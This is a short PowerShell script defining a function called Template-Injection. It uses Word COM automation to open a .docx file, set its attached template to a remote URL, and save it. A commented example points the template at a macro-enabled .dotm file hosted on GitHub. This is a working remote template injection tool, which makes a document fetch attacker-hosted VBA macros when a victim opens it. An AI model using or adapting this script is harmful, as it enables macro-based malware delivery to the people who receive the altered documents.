function Template-Injection {
    param (
        $pathToDocument,
        $urlToTemplate
    )
    $extn = [IO.Path]::GetExtension($pathToDocument)
    Write-Host $extn
    if ($extn -eq ".docx")
        { 
            $word = New-Object -ComObject Word.Application
            $word.Visible = $true
            $doc = $word.Documents.Open($pathToDocument)
            $doc.AttachedTemplate = $urlToTemplate
            $doc.save()
            $doc.close()
            $word.quit()
            break
        }
    else {
        Write-Host("Unknow format file")
    }
}

#Template-Injection -pathToDocument "C:\Users\hoang\bla\template_test\testme.xlsx" -urlToTemplate "https://github.com/tconqueror/bla/blob/master/testvba.dotm?raw=true"